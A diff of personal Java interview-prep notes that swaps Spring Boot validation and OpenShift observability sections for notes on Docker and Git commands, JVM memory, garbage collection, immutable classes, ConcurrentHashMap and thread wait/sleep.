-Before CRUD operations, check whether the user has permission.
+REPOSITORY   TAG       IMAGE ID
+nginx        latest    123abc
+mysql        8.0       456def 
+4️⃣ Run a Container 
 
-Example:
-```
-@PreAuthorize("hasRole('ADMIN')")
-@DeleteMapping("/users/{id}")
-```
+Run container from image.
 
-Only ADMIN can delete users.
+docker run nginx
 
-5️⃣ Resource Existence Validation
+Run in background:
 
-Before update or delete, check if resource exists.
+docker run -d nginx
 
-Example:
-```
-User user = userRepository.findById(id)
-        .orElseThrow(() -> new ResourceNotFoundException("User not found"));
-```
+Run with port mapping:
 
-Otherwise return:
+docker run -d -p 8080:80 nginx
 
-404 Not Found
-6️⃣ Data Format Validation
+Meaning:
 
-Validate fields like:
+HostPort:ContainerPort 
+5️⃣ List Running Containers 
+docker ps
 
-Email
+Show all containers:
 
-Phone number
-
-Date format
+docker ps -a 
+6️⃣ Stop Container 
+docker stop container_id
 
 Example:
 
-@Pattern(regexp="^[0-9]{10}$")
-private String phoneNumber;
-7️⃣ API-Level Validation
+docker stop 5d8f2a 
+7️⃣ Start Container 
+docker start container_id 
+8️⃣ Remove Container 
+docker rm container_id
 
-Validate request parameters.
+Force remove:
+
+docker rm -f container_id 
+9️⃣ Remove Image 
+docker rmi image_id
 
 Example:
 
-GET /users?page=-1
+docker rmi nginx 
+🔟 Build Docker Image (Important for Spring Boot) 
+docker build -t myapp .
 
-Invalid page number → reject request.
+Meaning:
 
-**Example CRUD Validation Flow** 
+-t = tag name
+.  = Dockerfile location 
+1️⃣1️⃣ Run Spring Boot Application Container 
 
-Client Request
-      ↓
-Controller
-      ↓
-Input Validation (@Valid)
-      ↓
-Business Validation
-      ↓
-Authorization Check
-      ↓
-Database Constraints
-      ↓
-Save/Update/Delete
-Example: Full Create Validation (Spring Boot)
+Example:
+
+docker run -d -p 8080:8080 myapp
+
+Now application runs at:
+
+http://localhost:8080 
+1️⃣2️⃣ View Container Logs
+docker logs container_id
+
+Follow logs:
+
+docker logs -f container_id 
+1️⃣3️⃣ Execute Command Inside Container 
+docker exec -it container_id bash
+
+Example:
+
+docker exec -it 23abf bash 
+1️⃣4️⃣ Docker System Cleanup 
+
+Remove unused containers/images:
+
+docker system prune 
+1️⃣5️⃣ Inspect Container 
+docker inspect container_id
+
+Shows container configuration. 
+
+
+## Git Wrong Commit Update 
+
+**1️⃣ If Commit is NOT Pushed Yet (Most Common)**
+
+Use:
+
+git commit --amend -m "Correct commit message"
+Example
 ```
-@PostMapping("/users")
-public ResponseEntity<User> createUser(@Valid @RequestBody UserDTO dto) {
+Wrong commit:
 
-    if(userRepository.existsByEmail(dto.getEmail())) {
-        throw new RuntimeException("Email already exists");
-    }
+git commit -m "fix"
 
-    User user = new User();
-    user.setName(dto.getName());
-    user.setEmail(dto.getEmail());
+Update it:
 
-    return ResponseEntity.ok(userRepository.save(user));
+git commit --amend -m "Fix null pointer issue in UserService"
+```
+
+This replaces the last commit message.
+
+**2️⃣ If Commit is Already Pushed**
+
+If the commit is already pushed to remote:
+
+Step 1
+```
+git commit --amend -m "Correct commit message"
+```
+Step 2 (Force Push)
+```
+git push --force
+```
+
+⚠️ Be careful with force push because it rewrites Git history.
+
+Better safer command:
+```
+git push --force-with-lease
+```
+**3️⃣ If You Want to Change Older Commit Message**
+
+Use interactive rebase.
+```
+git rebase -i HEAD~3
+```
+
+Example output:
+
+pick a1b2c3 First commit
+pick d4e5f6 Second commit
+pick g7h8i9 Third commit
+
+Change:
+
+pick → reword
+reword a1b2c3 First commit
+pick d4e5f6 Second commit
+pick g7h8i9 Third commit
+
+Git will open an editor to update the message.
+
+4️⃣ Interview Answer (Best Way)
+
+
+## Question- You committed code with the wrong message. How will you update it?
+
+Answer:
+
+If the commit is the latest one and not pushed, I will use
+git commit --amend -m "new message".
+
+If it is already pushed, I will amend the commit and use
+git push --force-with-lease to update the remote repository.
+
+If the commit is older, I will use interactive rebase (git rebase -i) to modify the commit message.
+
+## Git commands to push code to a remote repository (like GitHub/GitLab).
+
+1️⃣ Initialize Git Repository
+
+Go to your project folder and initialize Git.
+```
+git init
+```
+
+This creates a .git directory and starts version control.
+
+2️⃣ Check Status
+
+See which files are tracked/untracked.
+```
+git status
+```
+3️⃣ Add Files to Staging Area
+
+Add a specific file:
+```
+git add filename.java
+```
+
+Add all files:
+```
+git add .
+```
+4️⃣ Commit the Changes
+```
+git commit -m "Added user service implementation"
+```
+
+This creates a snapshot of your code.
+
+5️⃣ Add Remote Repository
+
+Link your local repo to GitHub/GitLab.
+```
+git remote add origin https://github.com/username/repository.git
+```
+
+Check remote:
+```
+git remote -v
+```
+6️⃣ Push Code to Remote Repository
+
+First push:
+```
+git push -u origin main
+```
+
+or if branch name is master
+```
+git push -u origin master
+```
+
+-u sets upstream so next time you can just run:
+```
+git push
+```
+
+7️⃣ Future Workflow (Daily Work)
+
+**After making code changes:**
+```
+git add .
+git commit -m "Updated payment service"
+git push
+```
+8️⃣ Complete Workflow (Most Common)
+```
+git init
+git add .
+git commit -m "Initial commit"
+git remote add origin https://github.com/username/repo.git
+git push -u origin main
+```
+
+## How to push a new branch?
+
+git checkout -b feature-login 
+git add . 
+git commit -m "Added login feature" 
+git push -u origin feature-login 
+ 
+
+
+## JVM Memory
+
+**1. Heap Memory** 
+
+
+The Heap stores objects and instance variables.
+
+Example:
+
+Student s = new Student();
+
+Memory allocation:
+
+Heap
+ └── Student object
+      ├── id
+      └── name
+
+**Characteristics:** 
+
+Shared by all threads
+
+Largest memory area
+
+Managed by Garbage Collector (GC)
+
+**Heap contains:** 
+
+Young Generation
+Old Generation
+
+Example objects stored:
+
+Objects created with new
+
+Instance variables
+
+Arrays
+
+Example:
+
+int[] arr = new int[5];
+
+Array stored in Heap.
+
+**2. Stack Memory** 
+
+Each thread has its own stack.
+
+The stack stores:
+
+Local variables
+
+Method calls
+
+Method parameters
+
+Partial results
+
+Example:
+```
+public void add() {
+    int a = 10;
+    int b = 20;
 }
 ```
 
-##  Service Failure Tracing
-1️⃣ Distributed Tracing in OpenShift
+Memory:
 
-**Use:**
+Stack
+ └── add()
+      ├── a
+      └── b
 
-OpenTelemetry + Jaeger
+Important properties:
 
-Architecture:-
+Created when thread starts
+
+Destroyed when thread ends
+
+Very fast access
+
+Thread-safe (each thread has its own stack)
+
+Stack also contains Stack Frames.
+
+Example call stack:
+
+main()
+   ↓
+methodA()
+   ↓
+methodB()
+
+Each method creates one stack frame.
+
+**3. Method Area** 
+
+The Method Area stores class-level information.
+
+Stored items:
+
+Class metadata
+
+Method code
+
+Static variables
+
+Runtime constant pool
+
+Example:
 ```
-Microservices
-     ↓
-OpenTelemetry instrumentation
-     ↓
-Jaeger Collector
-     ↓
-Jaeger Storage
-     ↓
-Jaeger UI
+class Employee {
+    static int count = 0;
+
+    void display() {}
+}
 ```
-**Tools Used**
+Memory:
 
-**Tool**				**Purpose**
-OpenTelemetry		  	Generates Trace ID & Span ID
-Jaeger					Collects traces
-Jaeger UI				Visualizes request flow
+Method Area
+ ├── Employee class metadata
+ ├── static variable count
+ └── method bytecode display()
 
-Example trace visualization:
+Shared across all threads.
+
+In modern JVM implementations, the method area is implemented as Metaspace.
+
+**4. Program Counter (PC Register)** 
+
+Each thread has its own PC register.
+
+It stores:
+
+Address of the currently executing instruction
+
+Example:
+
+Line 10 executing
+Line 11 executing
+Line 12 executing
+
+The PC register tracks which instruction JVM should execute next.
+
+**5. Native Method Stack** 
+
+Used when Java calls native methods written in C/C++.
+
+Example:
+
+System.out.println("Hello");
+
+Internally calls native code.
+
+Native stack handles:
+
+JNI calls
+
+OS-level operations
+
+
+| Feature            | String Pool           | Runtime Constant Pool         |
+| ------------------ | --------------------- | ----------------------------- |
+| Purpose            | Store string literals | Store class constants         |
+| Scope              | Global                | Per class                     |
+| Stored items       | Only strings          | Strings, numbers, method refs |
+| Location (Java 8+) | Heap                  | Method Area / Metaspace       |
+
+
+
+## Garbage Collection
+
+Garbage Collection is the automatic process of removing unused objects from memory (Heap) so that memory can be reused.
+
+In Java, developers do not manually free memory like in C/C++.
+
+The JVM automatically deletes objects that are no longer reachable.
+
+Example
 ```
-Gateway
-  ↓
-UserService
-  ↓
-OrderService
-  ↓
-PaymentService ❌
+Student s = new Student();
+s = null;
 ```
 
-**Jaeger UI shows:**
+Here:
 
-a)Trace ID
+Object created in Heap
 
-b)service call chain
+Reference removed
 
-c)latency
+Object becomes eligible for Garbage Collection
 
-d)failure points
+Memory:
 
-OpenShift provides Jaeger Operator to install it.
+Heap
+ └── Student object  ❌ (no reference)
 
-2️⃣ Centralized Logging in OpenShift
+GC will remove it.
 
-**Use:**
+## Why Garbage Collection is Needed ?
 
-Vector + Loki + Grafana
+Without GC:
 
-**Architecture:**
+Memory keeps filling up
+
+Application crashes
+
+Memory leaks occur
+
+GC helps:
+
+✔ Automatic memory management
+✔ Prevents memory leaks
+✔ Improves performance
+✔ Simplifies development
+
+Important Concept: Reachability
+
+JVM uses reachability analysis.
+
+An object is alive if it is reachable from:
+
+Stack references
+
+Static references
+
+JNI references
+
+Active threads
+
+If no reference exists → object becomes garbage.
+
+Example:
+```
+Student s1 = new Student();
+Student s2 = new Student();
+
+s1 = s2;
+```
+
+Memory:
+
+Heap
+ ├── Student1 ❌ unreachable
+ └── Student2 ✔ reachable
+
+Student1 becomes eligible for GC.
+
+## JVM Heap Structure
+
+Garbage collection works inside Heap memory.
+
+Heap is divided into generations.
+
+Heap
+│
+├── Young Generation
+│     ├── Eden
+│     ├── Survivor S0
+│     └── Survivor S1
+│
+└── Old Generation
+
+
+**1. Young Generation**
+
+Where new objects are created.
+
+Contains:
+
+Eden
+Survivor 0
+Survivor 1
+
+**Flow:**
+
+New Object
+   ↓
+Eden
+   ↓ (Minor GC)
+Survivor Space
+   ↓
+Old Generation
+Eden Space
+
+All new objects are created here.
+
+Example:
+
+Student s = new Student();
+
+Stored in:
+
+Eden Space
+
+When Eden becomes full:
+
+➡ Minor GC occurs
+
+Survivor Spaces (S0 & S1)
+
+Two survivor spaces exist:
+
+S0
+S1
+
+Objects that survive GC move between these spaces.
+
+Flow example:
+
+Eden → S0 → S1 → Old Generation
+
+If object survives many GC cycles → moved to Old Generation.
+
+2. Old Generation (Tenured Space)
+
+Stores long-lived objects.
+
+Examples:
+
+Singleton objects
+
+Cached objects
+
+Long-running session objects
+
+When Old Generation fills:
+
+➡ Major GC (Full GC) occurs.
+
+Types of Garbage Collection
+1. Minor GC
+
+Occurs in Young Generation.
+
+Triggered when:
+
+Eden Space becomes full
+
+Steps:
+
+Identify reachable objects
+
+Move them to Survivor space
+
+Delete unreachable objects
+
+Fast operation.
+
+2. Major GC
+
+Occurs in Old Generation.
+
+Triggered when:
+
+Old Generation becomes full
+
+Steps:
+
+Scan entire heap
+
+Remove unused objects
+
+Compact memory
+
+Slower than Minor GC.
+
+3. Full GC
+
+Full GC cleans:
+
+Young Generation
+Old Generation
+Metaspace
+
+This is the slowest GC.
+
+Garbage Collection Algorithms
+
+Different JVMs use different GC algorithms.
+
+1. Serial GC
+Single thread GC
+Stop-the-world
+
+Use when:
+
+Small applications
+
+2. Parallel GC
+Multiple GC threads
+High throughput
+
+Default in older Java versions.
+
+3. G1 GC
+
+Garbage First (G1) GC
+
+Default GC in modern Java.
+
+Features:
+
+Region-based heap
+
+Predictable pause times
+
+Good for large applications
+
+4. ZGC
+
+Z Garbage Collector
+
+Features:
+
+Ultra low latency (<10 ms)
+
+Handles very large heaps
+
+Mostly concurrent
+
+Used in:
+
+Financial systems
+
+Low-latency services
+
+5. Shenandoah GC
+
+Another low pause time GC.
+
+Features:
+
+Concurrent compaction
+
+Very small pause times
+
+
+
+When a class implements two interfaces that have the same default method, Java does not know which method to use, and it results in a compilation error unless the class provides its own implementation.
+
+Example Scenario
 
 ```
-Pods (Microservices)
-        ↓
-Vector (log collector)
-        ↓
-Loki (log storage)
-        ↓
-Grafana (log visualization)
+interface A {
+    default void show() {
+        System.out.println("A's show method");
+    }
+}
+
+interface B {
+    default void show() {
+        System.out.println("B's show method");
+    }
+}
+
+class MyClass implements A, B {
+    public static void main(String[] args) {
+        MyClass obj = new MyClass();
+        obj.show();  // Compilation Error if not overridden
+    }
+}
+```
+Compilation Error:
+Duplicate default methods named show with the parameters () are inherited from the types A and B.
+
+How to Resolve This Conflict? To resolve the ambiguity, we must override the conflicting method in MyClass and explicitly specify which interface's method to call using InterfaceName.super.methodName().
+
+```
+class MyClass implements A, B {
+    @Override
+    public void show() {
+        // Explicitly calling interface method
+        A.super.show();  // Calls A's default method
+        // B.super.show(); // If we want to call B's method instead
+    }
+
+    public static void main(String[] args) {
+        MyClass obj = new MyClass();
+        obj.show();  // Prints: A's show method
+    }
+}
+```
+## @Transactional Annotation in Spring Boot
+
+The @Transactional annotation in Spring Boot is used to manage database transactions. It ensures that a series of database operations are executed as a single unit of work—either all succeed or all fail (rollback in case of an error).
+
+```java
+@Transactional(propagation = Propagation.REQUIRES_NEW)
+public void someMethod() {
+    // Your code here
+}
 ```
 
-**Tools  	Used**
-Tool		Purpose
-Vector		Collect logs from pods
-Loki		Store logs
-Grafana		Search and visualize logs
+## Garbage Collection
 
-OpenShift provides this through:
+Garbage Collection (GC) in Java is an automatic memory management process that removes unused objects from memory, preventing memory leaks and optimizing performance.
 
-Red Hat OpenShift Logging Operator
+## 📌 How Garbage Collection Works
+Java uses **automatic memory management**, where the JVM tracks and removes objects that are no longer reachable.
 
-3️⃣ Complete Observability Architecture in OpenShift
 
-                     Microservices
-                          │
-        ┌─────────────────┼─────────────────┐
-        │                 │                 │
-     Tracing            Logging           Metrics
-        │                 │                 │
- OpenTelemetry          Vector         Prometheus
-        │                 │                 │
-      Jaeger             Loki            Storage
-        │                 │                 │
-     Jaeger UI           Grafana          Grafana
-	 
-4️⃣ Example Debugging Flow
+### Heap Structure (Very Important ⭐)
 
-Request fails.
+Java heap is divided into:
 
-Trace ID:
+Young Generation
+  ├── Eden
+  ├── Survivor S0
+  └── Survivor S1
 
-traceId = 7fa3c21b
-Step 1 — Check Jaeger UI
+Old Generation (Tenured)
 
-Trace shows:
+### Young Generation
+
+New objects are created in Eden
+
+Minor GC happens here
+
+Objects that survive move to Survivor spaces
+
+After multiple GCs → moved to Old Generation
+
+### Old Generation
+
+Stores long-living objects
+
+Major GC / Full GC happens here
+
+Slower than Minor GC
+
+### 🔄 Phases of Garbage Collection
+1. **Mark** – Identifies all objects still in use.
+2. **Sweep** – Deletes objects that are no longer reachable.
+3. **Compact** – Moves remaining objects together to optimize memory allocation.
+
+## 🔥 JVM Memory Areas and GC
+Java memory is divided into different regions:
+
+### **1. Young Generation**
+- Contains newly created objects.
+- Uses **Minor GC** to clean up unused objects quickly.
+- Divided into:
+  - **Eden Space** (new objects)
+  - **Survivor Spaces (S0, S1)** (objects that survived Minor GC)
+
+### **2. Old Generation (Tenured Generation)**
+- Stores long-lived objects.
+- Uses **Major (Full) GC**.
+
+### **3. Metaspace (Java 8+)**
+- Stores class metadata.
+- Unlike **PermGen** (Java 7 and below), it can grow dynamically.
+
+## ⚡ Types of Garbage Collectors
+Java provides multiple GC implementations to optimize performance:
+
+| Garbage Collector | Description | JVM Option |
+|------------------|-------------|-------------|
+| **Serial GC** | Single-threaded, best for small applications | `-XX:+UseSerialGC` |
+| **Parallel GC** | Multi-threaded, best for multi-core systems | `-XX:+UseParallelGC` |
+| **CMS (Concurrent Mark-Sweep) GC** | Reduces pause time, suitable for low-latency applications (deprecated in Java 9+) | `-XX:+UseConcMarkSweepGC` |
+| **G1 (Garbage First) GC** | Divides heap into regions, balances throughput and latency, Performs incremental GC,Large heap applications & Microservices | `-XX:+UseG1GC` |
+| **ZGC (Java 11+)** | Ultra-low latency, handles large heaps efficiently | `-XX:+UseZGC` |
+| **Shenandoah GC (Java 12+)** | Performs concurrent compaction with low-pause times | `-XX:+UseShenandoahGC` |
+
+## 🛠 Forcing Garbage Collection
+Though GC is automatic, you can suggest it using:
+```java
+System.gc();  // Requests GC (not guaranteed)
+Runtime.getRuntime().gc();
 ```
-Gateway → UserService → OrderService → PaymentService ❌
+However, JVM **decides when to run GC**, so explicit calls are **not recommended**.
+
+## 🚀 Best Practices for Efficient GC
+- Use **object pooling** for expensive objects.
+- Set unused object references to `null`.
+- Avoid **memory leaks** (e.g., static references, unclosed resources).
+- Optimize **GC tuning parameters** based on profiling.
+- Use **profiling tools** like VisualVM, JConsole, Eclipse Memory Analyzer.
+
+
+  
+## How Does Garbage Collection Work?
+
+Objects are allocated in heap memory when created using new.
+
+Garbage Collector identifies unreachable objects (objects with no active references).
+
+GC removes those objects and reclaims memory.
+
+Memory is compacted and optimized to reduce fragmentation.
+
+## When Does Garbage Collection Happen?
+
+The JVM runs GC automatically when it detects low memory.
+
+You can suggest GC using System.gc(), but it is not guaranteed to run immediately.
+
+GC primarily occurs during idle CPU time to minimize performance impact.
+
+
+### JVM Memory Areas (Quick Map)
+┌───────────────┐
+│   Stack       │ → Local variables, method calls
+├───────────────┤
+│   Heap        │ → Objects, instance variables
+├───────────────┤
+│ Method Area   │ → Class metadata, static variables
+│ (Metaspace)  │
+├───────────────┤
+│ PC Register   │
+├───────────────┤
+│ Native Stack  │
+└───────────────┘
+
+### String/ StringBuilder/ StringBuffer
+
+String → Immutable and thread-safe
+
+StringBuilder → Mutable and fast, not thread-safe
+
+StringBuffer → Mutable and thread-safe but slower
+
+
+## How to Make a Class Immutable in Java?
+
+An immutable class is a class whose objects cannot be modified after creation. All fields of an immutable object remain constant throughout its lifecycle.
+
+Steps to Create an Immutable Class in Java
+
+To make a class immutable, follow these best practices:
+
+#### 1. Declare the class as final
+   
+This prevents subclassing, which could allow modification of fields.
+
+final class ImmutableClass {
+
+#### 2. Make all fields private and final
+
+Fields should be private to prevent direct access and final to ensure they are assigned only once.
+
+private final int id;
+private final String name;
+
+#### 3. Initialize fields via a constructor
+
+Provide a constructor to initialize all fields.
+
+public ImmutableClass(int id, String name) {
+    this.id = id;
+    this.name = name;
+}
+
+#### 4. Do not provide setter methods
+
+Setters allow modification, so they should not be present.
+
+#### 5. Return deep copies of mutable fields in getters
+   
+If a field is a mutable object (like a List or Date), return a defensive copy to prevent modification.
+
+public Date getDate() {
+    return new Date(date.getTime());  // Defensive copy
+}
+
+
+Here's how you can design one properly:-
+
 ```
-Step 2 — Check Grafana Logs
+public final class Person {
+    private final String name;
+    private final int age;
+    private final List<String> hobbies;
 
-Search:
+    public Person(String name, int age, List<String> hobbies) {
+        this.name = name;
+        this.age = age;
+        // Defensive copy to avoid external mutation
+        this.hobbies = hobbies == null ? List.of() : new ArrayList<>(hobbies);
+    }
 
-traceId=7fa3c21b
+    public String getName() {
+        return name;
+    }
 
-Logs show:
+    public int getAge() {
+        return age;
+    }
 
-PaymentService - Payment gateway timeout
+    public List<String> getHobbies() {
+        // Return a copy to preserve immutability
+        return new ArrayList<>(hobbies);
+    }
+}
+```
 
-Issue identified.
+
+
+
+## 🔹 Summary Table
+Static Feature	Description	Example Usage
+1) Static Variable -	Shared by all instances of a class	static int count;
+2) Static Method - Belongs to the class, not an instance	static void show();
+3) Static Block	- Executes once when the class loads	static { init(); }
+4) Static Nested Class	- Does not require an outer class instance	static class Inner {}
+5) Static Import - Allows direct use of static members	import static java.lang.Math.*;
+
+### Difference Between @PathVariable and @RequestParam
+
+Both are used to read values from HTTP requests, but from different parts of the URL.
+
+Extracts value from the URL path
+
+Used to identify a specific resource
+
+Use @PathVariable when the value is a key part of the resource path (e.g., /orders/{orderId}).
+
+Use @RequestParam for optional query parameters that refine the request (e.g., /orders?status=shipped).
+
+
+#### 1️⃣ @PathVariable
+
+Extracts value from the URL path
+
+Used to identify a specific resource
+
+Example URL
+
+GET /users/101
+```
+@GetMapping("/users/{id}")
+public User getUser(@PathVariable int id) {
+    return userService.getUser(id);
+}
+```
+
+#### When to Use
+✔ Resource identification
+✔ RESTful URLs
+✔ Mandatory values
+
+### 2️⃣ @RequestParam
+
+Extracts value from query parameters
+
+Used for filters, search, optional data
+Example URL
+GET /users?age=25&city=Delhi
+```
+@GetMapping("/users")
+public List<User> getUsers(
+        @RequestParam int age,
+        @RequestParam String city) {
+    return userService.getUsers(age, city);
+}
+```
+```
+@RequestParam(required = false) String city
+```
+
+
+
+## Ways to Represent a "Has-a" Relationship in Java:
+
+In object-oriented design, a "has-a" relationship represents composition or aggregation, meaning one class contains an instance (or multiple instances) of another class. This is also known as object association.
+
+#### 🔹 1. Inheritance (IS-A Relationship)
+
+Type: Generalization / Specialization
+
+Meaning: One class is a subtype of another.
+
+Direction: Unidirectional (child → parent)
+
+Example: Dog IS-A Animal
+
+Use Case: Code reuse, polymorphism
+
+```
+class Animal {}
+class Dog extends Animal {}
+```
+#### 🔹 2. Association (HAS-A Relationship)
+Type: Structural
+
+Meaning: One class uses or refers to another.
+
+Direction: Unidirectional or Bidirectional
+
+Example: Student associated with College
+
+```
+class College {}
+class Student {
+    private College college;
+}
+```
+### 🔹 3. Aggregation (HAS-A but Weak Relationship)
+Type: Whole-Part (weak)
+
+Meaning: One class contains another, but both can exist independently.
+
+Direction: Usually Unidirectional
+
+Example: University has Departments
+
+```
+class Department {}
+class University {
+    private List<Department> departments;
+}
+```
+### 🔹 4. Composition (HAS-A and Strong Relationship)
+Type: Whole-Part (strong)
+
+Meaning: One class owns another. Lifecycles are tied.
+
+Direction: Unidirectional
+
+Example: Library contains Books. If Library is deleted, Books are too.
+
+```
+class Book {}
+class Library {
+    private List<Book> books = new ArrayList<>();
+}
+```
+
+
+# Difference Between HashMap and ConcurrentHashMap
+
+| Feature | HashMap | ConcurrentHashMap |
+|------|--------|------------------|
+| Thread Safety | ❌ Not thread-safe | ✅ Thread-safe |
+| Synchronization | ❌ No synchronization | ✅ Internal synchronization |
+| Null Key | ✅ Allows one null key | ❌ Not allowed |
+| Null Values | ✅ Allows multiple null values | ❌ Not allowed |
+| Performance | Faster in single-threaded | High performance in multithreaded |
+| Iterator Type | Fail-fast | Fail-safe |
+| Concurrent Modification | ❌ Throws `ConcurrentModificationException` | ✅ No exception |
+| Use Case | Single-threaded apps | Multi-threaded apps |
+
+---
+
+## Locking Mechanism Comparison
+
+| Aspect | HashMap | ConcurrentHashMap |
+|-----|--------|------------------|
+| Locking Used | ❌ No locking | ✅ Yes |
+| Lock Granularity | ❌ N/A | Fine-grained locking |
+| Java 7 Locking | ❌ Not applicable | Segment-level locking |
+| Java 8+ Locking | ❌ Not applicable | Bucket-level locking + CAS |
+| Whole Map Lock | ❌ No | ❌ No |
+| Concurrent Reads | ❌ Unsafe | ✅ Fully allowed |
+| Concurrent Writes | ❌ Unsafe | ✅ Safe |
+
+---
+
+## Locking Explanation
+
+### HashMap
+- No locking mechanism
+- Multiple threads can modify data simultaneously
+- Leads to:
+  - Data inconsistency
+  - Infinite loops (rehashing)
+  - Runtime exceptions
+
+---
+
+### ConcurrentHashMap (Java 7)
+- Map divided into **segments**
+- Each segment had its own lock
+- Multiple threads could access different segments at the same time
+
+---
+
+### ConcurrentHashMap (Java 8+)
+- Segment locking removed
+- Uses:
+  - **CAS (Compare-And-Swap)**
+  - **synchronized blocks** at bucket level
+- Much better scalability and performance
+
+---
+
+## Iterator Behavior
+
+| Map Type | Iterator Behavior |
+|-------|-----------------|
+| HashMap | Fail-fast (throws exception on modification) |
+| ConcurrentHashMap | Fail-safe (works during modification) |
+
+---
+
+## Key Interview One-Liner
+
+> HashMap is non-thread-safe with no locking, whereas ConcurrentHashMap is thread-safe using fine-grained locking (bucket-level in Java 8+) and does not allow null keys or values.
+
+```
+
+| Feature                         | Synchronized HashMap        | ConcurrentHashMap                      |
+| ------------------------------- | --------------------------- | -------------------------------------- |
+| Thread Safety                   | ✅ Yes                       | ✅ Yes                                  |
+| Locking Level                   | **Whole map lock**          | **Bucket-level locking**               |
+| Concurrent Reads                | ❌ Only one thread at a time | ✅ Multiple threads allowed             |
+| Concurrent Writes               | ❌ One thread at a time      | ✅ Multiple threads (different buckets) |
+| Performance                     | ❌ Slow                      | ✅ High                                 |
+| Null Key                        | ✅ Allowed                   | ❌ Not allowed                          |
+| Null Value                      | ✅ Allowed                   | ❌ Not allowed                          |
+| Iterator Type                   | Fail-fast                   | Fail-safe                              |
+| ConcurrentModificationException | ❌ Yes                       | ❌ No                                   |
+| Scalability                     | ❌ Poor                      | ✅ Excellent                            |
+
+```
+
+
+## The wait() and sleep() methods in Java are used to pause the execution of a thread, but they have different use cases and behaviours.
+
+# 1. wait() Method
+a) Defined In: java.lang.Object
+
+b) Purpose: Causes the current thread to wait until another thread calls notify() or notifyAll() on the same object.
+
+c) Synchronization: Must be called within a synchronized block or method; otherwise, it throws IllegalMonitorStateException.
+
+d) Releases Lock: Yes, it releases the object's monitor lock while waiting.
+
+e) Wakes Up: When notify() or notifyAll() is called or when interrupted.
+
+Example:
+```
+class WaitExample {
+    public static void main(String[] args) {
+        final Object lock = new Object();
+
+        Thread thread1 = new Thread(() -> {
+            synchronized (lock) {
+                try {
+                    System.out.println("Thread 1 waiting...");
+                    lock.wait();
+                    System.out.println("Thread 1 resumed...");
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+            }
+        });
+
+        Thread thread2 = new Thread(() -> {
+            synchronized (lock) {
+                System.out.println("Thread 2 notifying...");
+                lock.notify();
+            }
+        });
+
+        thread1.start();
+        try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); }
+        thread2.start();
+    }
+}
+Output:
+mathematica
+Thread 1 waiting...
+Thread 2 notifying...
+Thread 1 resumed...
+```
+# 2. sleep() Method
+a) Defined In: java.lang.Thread
+
+b) Purpose: Pauses the execution of the current thread for a specified period.
+
+c) Synchronization: Does not require a synchronized block.
+
+d) Releases Lock: No, it holds the lock if inside a synchronized block.
+
+e) Wakes Up: Automatically after the specified time or if interrupted.
+
+Example:
+```
+class SleepExample {
+    public static void main(String[] args) {
+        Thread thread = new Thread(() -> {
+            try {
+                System.out.println("Thread sleeping...");
+                Thread.sleep(2000);
+                System.out.println("Thread woke up...");
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        });
+
+        thread.start();
+    }
+}
+Output:
+mathematica
+
+Thread sleeping...
+(Thread pauses for ~2 seconds)
+Thread woke up...
+```
+## Difference Between wait() and sleep()
+
+| Feature               | wait()                                  | sleep()                                 |
+|----------------------|--------------------------------------|--------------------------------------|
+| **Defined In**       | `java.lang.Object`                   | `java.lang.Thread`                   |
+| **Requires Synchronization?** | Yes (`synchronized` block/method) | No |
+| **Releases Lock?**   | Yes                                   | No |
+| **Wake-Up Condition** | `notify()` / `notifyAll()` or interrupted | After the specified time or interrupted |
+| **Thread State**     | `WAITING` or `TIMED_WAITING`         | `TIMED_WAITING`                      |
+| **Can Be Called On?** | Any object                           | Only threads (`Thread.sleep()`)      |
+
+
+
+
+# When to Use `wait()` and `sleep()` in Java
+
+Both `wait()` and `sleep()` are used to pause a thread, but their use cases are different. Here's when to use each:
+
+## ✅ Use `wait()` When:
+
+## 1️⃣ Thread Communication is Required  
+- If multiple threads are working together and need to wait for some condition to be met before proceeding.  
+- **Example**: A producer-consumer problem where the consumer waits until the producer adds items to a queue.
+
+## 2️⃣ Releasing Locks is Necessary  
+- If a thread should pause execution but allow other threads to acquire the lock and proceed.  
+- **Example**: A thread waiting for a resource to become available.
+
+## 3️⃣ Event-Driven Synchronization is Needed  
+- If a thread should only resume when another thread calls `notify()` or `notifyAll()`.  
+- **Example**: A thread waiting for user input before proceeding.
+
+## 🔹 Example Usage:
+```java
+class SharedResource {
+    private boolean available = false;
+
+    public synchronized void waitForResource() throws InterruptedException {
+        while (!available) {
+            wait(); // Releases the lock and waits
+        }
+        System.out.println("Resource acquired!");
+    }
+
+    public synchronized void releaseResource() {
+        available = true;
+        notify(); // Notifies waiting threads
+    }
+}
+```
+### ✅ Use sleep() When:
+
+
+## 1️⃣ Pausing Execution for a Fixed Time
+If a thread needs to be paused for a specific duration without depending on other threads.
+Example: A scheduled task that runs every few seconds.
+
+## 2️⃣ CPU Load Reduction
+If a thread should pause periodically to avoid high CPU usage.
+Example: A polling mechanism that checks for changes every few seconds.
+
+## 3️⃣ Retry Logic Implementation
+If a thread needs to retry an operation after a fixed delay.
+
+Example: Retrying a failed API request after a short pause.
+
+🔹 Example Usage:
+```
+class SleepExample {
+    public static void main(String[] args) {
+        System.out.println("Task started...");
+        try {
+            Thread.sleep(2000); // Pauses for 2 seconds
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+        System.out.println("Task resumed after sleep...");
+    }
+}
+```
+
+
+### We can create a thread using two primary approaches:-
+
+Extending the Thread class
+Implementing the Runnable interface
+Additionally, Java 8 introduced lambda expressions and Java 5 introduced the Executor framework, which are also commonly used to create and manage threads.
+
+# 1️⃣ Creating a Thread by Extending Thread Class
+
+The Thread class provides a run() method that we can override.
+We create an instance of the subclass and call start() to begin execution.
+🔹 Example:
+```
+class MyThread extends Thread {
+    @Override
+    public void run() {
+        System.out.println("Thread is running...");
+    }
+}
+
+public class ThreadExample {
+    public static void main(String[] args) {
+        MyThread t1 = new MyThread();
+        t1.start(); // Starts the thread execution
+    }
+}
+```
+🔹 Output:
+
+arduino
+
+Thread is running...
+✅ Use Case: When we need to override Thread methods or maintain object-oriented behavior.
+
+# 2️⃣ Creating a Thread by Implementing Runnable Interface
+
+Runnable is a functional interface with a single method run().
+The Thread class takes a Runnable object in its constructor.
+🔹 Example:
+```
+class MyRunnable implements Runnable {
+    @Override
+    public void run() {
+        System.out.println("Thread is running...");
+    }
+}
+
+public class RunnableExample {
+    public static void main(String[] args) {
+        Thread t1 = new Thread(new MyRunnable());
+        t1.start();
+    }
+}
+```
+🔹 Output:
+
+arduino
+Copy
+Edit
